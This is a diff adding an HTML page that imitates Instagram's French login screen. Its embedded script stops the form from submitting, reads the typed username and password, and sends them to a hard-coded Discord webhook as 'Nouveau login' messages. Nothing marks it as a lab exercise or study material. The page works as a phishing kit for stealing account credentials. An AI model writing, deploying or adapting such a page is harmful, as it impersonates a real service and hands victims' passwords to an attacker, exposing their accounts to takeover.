@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-section">
+            <div class="login-box">
+                <img src="instagram-logo.png" alt="Instagram" class="logo">
+                
+                <!-- Bouton "Continuer avec Facebook" -->
+                <button class="btn fb-login">Continuer avec Facebook</button>
+                
+                <!-- Barre de séparation et texte "OU" -->
+                <div class="or-divider">
+                    <div class="line"></div>
+                    <p>OU</p>
+                    <div class="line"></div>
+                </div>
+
+                <!-- Formulaire de connexion -->
+                <form id="loginForm" method="post">
+                    <div class="textbox">
+                        <input type="text" id="username" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
+                    </div>
+                    <div class="textbox">
+                        <input type="password" id="password" placeholder="Mot de passe" required>
+                    </div>
+                    
+                    <!-- Lien "Mot de passe oublié ?" -->
+                    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                    
+                    <!-- Bouton "Se connecter" -->
+                    <button type="submit" class="btn">Se connecter</button>
+                </form>
+
+                <!-- Texte "Vous n'avez pas de compte ? Inscrivez-vous" -->
+                <div class="signup-section">
+                    <p>Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
+                </div>
+
+                <!-- Nouveau texte "Signaler le contenu" -->
+                <p class="report-text">Vous pouvez également <a href="#">signaler le contenu</a> que vous pensez illégal dans votre pays sans vous connecter.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script pour envoyer les données au webhook Discord -->
+    <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();  // Empêche le formulaire de soumettre normalement
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        const webhookURL = "https://discord.com/api/webhooks/1271817041900339382/HOK5QtR1vuEVOnCr7YnlmiT__OXhpXzZbKCJ4H7L3mviY0-kEBy6OTkAMo2kv_G3WyES"; // Remplace par l'URL de ton webhook Discord
+
+        const message = {
+            username: "Formulaire Instagram",
+            avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png",
+            content: `Nouveau login :\n**Utilisateur**: ${username}\n**Mot de passe**: ${password}`
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(message)
+        }).catch(error => {
+            console.error('Erreur lors de l\'envoi des données au webhook : ', error);
+        });
+    });
+    </script>
+</body>
+</html>
